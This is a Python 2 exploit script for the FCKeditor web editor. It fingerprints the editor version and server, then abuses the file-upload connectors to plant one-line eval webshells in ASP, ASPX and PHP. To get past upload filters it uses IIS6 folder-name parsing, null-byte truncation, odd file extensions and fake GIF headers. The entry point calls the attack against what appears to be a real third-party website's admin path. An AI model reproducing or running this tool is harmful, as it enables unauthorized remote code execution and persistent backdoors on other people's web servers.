#-------------------------------------------------------------------------------
# Name:        module1
# Purpose:
#
# Author:      Rstar
#
# Created:     08/09/2012
# Copyright:   (c) Rstar 2012
# Licence:     <your licence>
#-------------------------------------------------------------------------------
#!/usr/bin/env python
import urllib2,re,httplib,socket
def handurl(fck_url):
    fck_url_dic = dict()
    if fck_url.find('http')<0:
        fck_url_dic['realurl']='http://'+fck_url
    else:
        fck_url_dic['realurl'] = fck_url
    get_port = fck_url_dic['realurl'].split(':')
    if len(get_port) ==2:

        fck_url_dic['port'] = 80
    else:
        re_port = re.compile('(\d+)\/')
        port_str =re_port.findall(get_port[2])[0]
        fck_url_dic['port']= int(port_str)
    fck_url_list = fck_url_dic['realurl'].split('/')
    if fck_url_list[2].find(':')>0:
        fck_url_dic['host'] = fck_url_list[2].replace(port_str,'')
        fck_url_dic['host'] = fck_url_dic['host'].replace(':','')

    else:
        fck_url_dic['host'] = fck_url_list[2]
    fckpath = fck_url_dic['realurl'].replace('http://','')
    fckpath = fckpath.replace(fck_url_dic['host'],'')
    try :
        fckpath = fckpath.replace(fck_url_dic['port'],'')
    except:
        pass
    fck_url_dic['path']=fckpath
    return fck_url_dic

def get_version(fck_url):
    url_dic = handurl(fck_url)
    version_url = url_dic['realurl']+'/editor/dialog/fck_about.html'
    version_resp = urllib2.urlopen(version_url).read()
    re_version = re.compile('<b>(\d\.\d[\.\d]*).{0,10}<\/b>')
    parr = re_version.findall(version_resp)
    print '[+]The fck version is %s'%parr[0]
    return parr[0]

def os_and_webserver(fck_url):
    url_dic = handurl(fck_url)
    os_webserver=[]
    host = url_dic['host']
    fck_url = url_dic['realurl']
    test_url = fck_url+'editor/dIalOg/Fck_about.html'
    connection = httplib.HTTPConnection(host,timeout=8)
    connection.request('GET',test_url)
    response = connection.getresponse()
    resp_headers = response.getheader('server').upper()
    print '[+]The WebServer is %s'%(resp_headers)

    if resp_headers.find('APACHE')>=0:
        os_webserver.append('apache')

    elif resp_headers.find('IIS/6.0')>=0:
        os_webserver.append('IIS6')
    else:
        os_webserver.append('unkown webserver')

    if response.status == 404:
        os_webserver.append('Linux')
    elif response.status == 200:
        os_webserver.append('Windows')
    else :
        print "I got an undefind staus: %s" %(response.status)
        os_webserver.append('unkown os')
    return os_webserver
def fck_old_upload(fck_url,script_type):
    url_dic = handurl(fck_url)
    host = url_dic['host']
    port = url_dic['port']
    if script_type == 'asp':
        shell_name = 'she.cer'
        shell_content = '<%eval request("3")%>'
        path = url_dic['path']+'editor/filemanager/upload/asp/upload.asp'
    elif script_type == 'aspx':
        shell_name = 'she.aspx '
        shell_content = '<%@ Page Language="Jscript"%><%eval(Request.Item["3"],"unsafe");%>'
        path = url_dic['path']+'editor/filemanager/upload/aspx/upload.aspx'
    elif script_type == 'php':
        shell_name = 'she.php '
        path = url_dic['path']+'editor/filemanager/upload/php/upload.php'
        shell_content = '<?php eval($_POST[a]) ?>'
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    s.settimeout(8)

    payload = '-----------------------------20537215486483\r\n'
    payload += 'Content-Disposition: form-data; name="NewFile"; filename="%s"\r\n' %(shell_name)
    payload += 'Content-Type: image/jpeg\r\n\r\n'
    payload += 'GIF89a\r\n'
    payload +='%s\r\n\r\n\r\n' %(shell_content)
    payload += '-----------------------------20537215486483--\r\n'
    payload_length = len(payload)

    packet = 'POST '+path+' HTTP/1.1\r\n'
    packet += 'HOST: '+host+'\r\n'
    packet += 'Connection: Close\r\n'
    packet += 'Content-Type: multipart/form-data; boundary=---------------------------20537215486483\r\n'
    packet += 'Content-Length: %d'%payload_length+'\r\n'
    packet += '\r\n'
    packet = packet + payload

    s.send(packet)
    buf = s.recv(4000)
    #print buf
    s.close()
    re_shellurl = re.compile('OnUploadCompleted\(\d+\,\'(.+)\',\'she')
    shellurl = re_shellurl.findall(buf)
    if len(shellurl)>0:
        shellpath = 'http://'+host+'/'+shellurl[0]
        print '[+]I got a webshell:%s'%(shellpath)
        return True
    else:
        print '[-]Sorry i faild with Old version exp!'
        return False

def fck_old(fck_url):
    url_dic=handurl(fck_url)
    os_wserver = os_and_webserver(fck_url)
    if os_wserver[0] == 'IIS6':
        if fck_old_upload(fck_url,'asp'):
            return True
        elif fck_old_upload(fck_url,'aspx'):
            return True
        elif fck_old_upload(fck_url,'php'):
            return True
        else:
            pass
    elif os_wserver[0] == 'APACHE':
        if fck_old_upload(fck_url,'php'):
            return True
        else:
            return False
    else:
        return False


def fck_iis(fck_url):
    url_dic = handurl(fck_url)
    newurl= url_dic['realurl']+'editor/filemanager/connectors/aspx/connector.aspx?Command=CreateFolder&Type=File&CurrentFolder=%2Ftest.asp&NewFolderName=z&uuid=1244789975684'
    try:
        resp = urllib2.urlopen(newurl).read()
    except:
        print "[-]Got An Error"
        resp = ''
    if resp.find('number="0"')>0:
        print '[+]Ok,I create a new folder named test.asp'
        path = url_dic['path']+'editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=File&CurrentFolder=test.asp'
        host = url_dic['host']
        port = url_dic['port']
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        s.settimeout(8)

        payload = '-----------------------------20537215486483\r\n'
        payload += 'Content-Disposition: form-data; name="NewFile"; filename="xiao.jpg"\r\n'
        payload += 'Content-Type: image/jpeg\r\n\r\n'
        payload += 'GIF89a\r\n'
        payload +='<%eval request("3")%>\r\n\r\n\r\n'
        payload += '-----------------------------20537215486483--\r\n'
        payload_length = len(payload)

        packet = 'POST '+path+' HTTP/1.1\r\n'
        packet += 'HOST: '+host+'\r\n'
        packet += 'Connection: Close\r\n'
        packet += 'Content-Type: multipart/form-data; boundary=---------------------------20537215486483\r\n'
        packet += 'Content-Length: %d'%payload_length+'\r\n'
        packet += '\r\n'
        packet = packet + payload

        s.send(packet)
        buf = s.recv(4000)
        #print buf
        s.close()
        re_shellpath = re.compile('url=\"(.+test\.asp\/)\"')
        shellpath = re_shellpath.findall(resp)[0]
        re_shellurl = re.compile('OnUploadCompleted\(\d+\,\'(xiao.jpg)')
        parr_shellurl = re_shellurl.findall(buf)
        if len(parr_shellurl)>0:
            shellurl='http://'+host+shellpath+'xiao.jpg'
            print '[+]Lucky,!I got a webshell:%s'%shellurl
    else:
        print '[+]I faild with aspx connector,let me try asp'
        newurl_asp= url_dic['realurl']+'editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2Ftest.asp&NewFolderName=z&uuid=1244789975684'
        try:
            resp_asp = urllib2.urlopen(newurl_asp).read()
        except:
            print "[-]Got An Error!"
            resp_asp = ''
        if resp_asp.find('number="0"')>0:
            print '[+]Ok,I create a new folder named test.asp'
            path_asp = url_dic['path']+'editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=test.asp'
            host_asp = url_dic['host']
            port_asp = url_dic['port']
            s_asp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s_asp.connect((host,port))
            s_asp.settimeout(8)

            payload_asp = '-----------------------------20537215486483\r\n'
            payload_asp += 'Content-Disposition: form-data; name="NewFile"; filename="xiao.jpg"\r\n'
            payload_asp += 'Content-Type: image/jpeg\r\n\r\n'
            payload_asp += 'GIF89a\r\n'
            payload_asp +='<%eval request("3")%>\r\n\r\n\r\n'
            payload_asp += '-----------------------------20537215486483--\r\n'
            payload_length_asp = len(payload_asp)

            packet_asp = 'POST '+path_asp+' HTTP/1.1\r\n'
            packet_asp += 'HOST: '+host_asp+'\r\n'
            packet_asp += 'Connection: Close\r\n'
            packet_asp += 'Content-Type: multipart/form-data; boundary=---------------------------20537215486483\r\n'
            packet_asp += 'Content-Length: %d'%payload_length_asp+'\r\n'
            packet_asp += '\r\n'
            packet_asp= packet_asp + payload_asp

            s_asp.send(packet_asp)
            buf_asp = s_asp.recv(4000)
            #print buf
            s_asp.close()
            re_shellpath_asp = re.compile('url=\"(.+test\.asp\/)\"')
            shellpath_asp = re_shellpath_asp.findall(resp)[0]
            re_shellurl_asp = re.compile('OnUploadCompleted\(\d+\,\'(xiao.jpg)')
            parr_shellurl_asp = re_shellurl_asp.findall(buf)
            if len(parr_shellurl_asp)>0:
                shellurl_asp='http://'+host_asp+shellpath_asp+'xiao.jpg'
                print '[+]Lucky,!I got a webshell:%s'%shellurl_asp

        else:
            print '[+]I faild with asp connector,let me try php'
            newurl_php= url_dic['realurl']+'editor/filemanager/connectors/php/connector.php?Command=CreateFolder&Type=File&CurrentFolder=%2Ftest.asp&NewFolderName=z&uuid=1244789975684'
            try:
                resp_php = urllib2.urlopen(newurl_php).read()
            except:
                print "[-]Got An Error"
                resp_php = ''
            if resp_php.find('number="0"')>0:
                print '[+]Ok,I create a new folder named test.asp'
                path_php = url_dic['path']+'editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=test.asp'
                host_php = url_dic['host']
                port_php = url_dic['port']
                s_php = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s_php.connect((host,port))
                s_php.settimeout(8)

                payload_php = '-----------------------------20537215486483\r\n'
                payload_php += 'Content-Disposition: form-data; name="NewFile"; filename="xiao.jpg"\r\n'
                payload_php += 'Content-Type: image/jpeg\r\n\r\n'
                payload_php += 'GIF89a\r\n'
                payload_php +='<%eval request("3")%>\r\n\r\n\r\n'
                payload_php += '-----------------------------20537215486483--\r\n'
                payload_length_php = len(payload_php)

                packet_php = 'POST '+path_php+' HTTP/1.1\r\n'
                packet_php += 'HOST: '+host_php+'\r\n'
                packet_php += 'Connection: Close\r\n'
                packet_php += 'Content-Type: multipart/form-data; boundary=---------------------------20537215486483\r\n'
                packet_php += 'Content-Length: %d'%payload_length_php+'\r\n'
                packet_php += '\r\n'
                packet_php= packet_php + payload_php

                s_php.send(packet_php)
                buf_php = s_php.recv(4000)
                #print buf
                s_php.close()
                re_shellpath_php = re.compile('url=\"(.+test\.php\/)\"')
                shellpath_php = re_shellpath_php.findall(resp)[0]
                re_shellurl_php = re.compile('OnUploadCompleted\(\d+\,\'(xiao.jpg)')
                parr_shellurl_php = re_shellurl_php.findall(buf)
                if len(parr_shellurl_php)>0:
                    shellurl_php='http://'+host_php+shellpath_php+'xiao.jpg'
                    print '[+]Lucky,!I got a webshell:%s'%shellurl_php
            else:
                print "I failed with all connectors!"


def fck_264(fck_url):

    url_dic = handurl(fck_url)
    host = url_dic['host']
    path = url_dic['path']+'editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=s.php%00.gif'
    port = url_dic['port']
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    s.settimeout(8)

    payload = '-----------------------------277531038314945\r\n'
    payload += 'Content-Disposition: form-data; name="NewFile"; filename="xiao.jpg"\r\n'
    payload += 'Content-Type: image/jpeg\r\n\r\n'
    payload += 'GIF89a\r\n'
    payload +='<?php eval($_POST[a]) ?>\r\n\r\n\r\n'
    payload += '-----------------------------277531038314945--\r\n'

    payload_length = len(payload)

    packet = 'POST '+path+' HTTP/1.1\r\n'
    #packet = 'POST '+'/FCKeditor_2.5.1/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=FileUpload&Type=Image&CurrentFolder=s.php%00.gif HTTP/1.1\r\n'
    packet += 'HOST: '+host+'\r\n'
    packet += 'Connection: Close\r\n'
    packet += 'Content-Type: multipart/form-data; boundary=---------------------------277531038314945\r\n'
    packet += 'Content-Length: %d'%payload_length+'\r\n'
    packet += '\r\n'
    packet = packet + payload

    #print packet
    s.send(packet)
    buf = s.recv(4000)
    print buf
    s.close()
    re_shellurl = re.compile('OnUploadCompleted\(\d+\,\"(.+)\\x00\.gif')
    shellurl = re_shellurl.findall(buf)
    if len(shellurl)>0:
        print '[+]I got a webshell:http://%s%s\t password:a'%(host,shellurl[0])
    else:
        print '[-]Sorry i faild with 2.6.4exp!'
def fck_243(fck_url):
    url_dic = handurl(fck_url)
    host = url_dic['host']
    port = url_dic['port']
    fck_url = url_dic['realurl']
    path = url_dic['path'] + 'editor/filemanager/upload/php/upload.php?Type=Media'
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((host,port))
    s.settimeout(8)

    payload = '-----------------------------277531038314945\r\n'
    payload += 'Content-Disposition: form-data; name="NewFile"; filename="shell.php"\r\n'
    payload += 'Content-Type: application/octet-stream\r\n\r\n'
    payload += 'GIF89a\r\n'
    payload +='<?php eval($_POST[a]) ?>\r\n\r\n\r\n'
    payload += '-----------------------------277531038314945--\r\n'

    payload_length = len(payload)

    packet = 'POST '+path+' HTTP/1.1\r\n'
    packet += 'HOST: '+host+'\r\n'
    packet += 'Connection: Close\r\n'
    packet += 'Content-Type: multipart/form-data; boundary=---------------------------277531038314945\r\n'
    packet += 'Content-Length: %d'%payload_length+'\r\n'
    packet += '\r\n'
    packet = packet + payload

    #print packet
    s.send(packet)
    buf = s.recv(4000)
    #print buf
    s.close()
    re_shellurl = re.compile('OnUploadCompleted\(0\,\"(.+\.php)\",\".+\.\php\"')
    shellurl = re_shellurl.findall(buf)
    if len(shellurl)>0:
        print '[+]I got a webshell: http://%s%s'%(host,shellurl[0])
    else:
        print '[-]Sorry i faild with 2.4.3exp!'
def main_fck(fck_url):
    #fck_url = raw_input('Please input the fckurl:')
    print "[+]Trying:%s"%fck_url
    version = get_version(fck_url)
    if version <='2.4.3':
        if fck_old(fck_url):
            return True
        else:
            print 'Faild with old version upload'

    if os_and_webserver(fck_url)[0] == 'IIS6' :
        print '[+]The webserver is IIS6.0'
        fck_iis(fck_url)

    else:

        if version <= '2.4.4':
            fck_243(fck_url)
        elif version > '2.4.4' and version <='2.6.4':
            fck_264(fck_url)
        else:
            print "[-]I don't know how to get shell of this version"

if __name__ == '__main__':

    main_fck('http://ttbuy.com.tw/admin/fckeditor/')

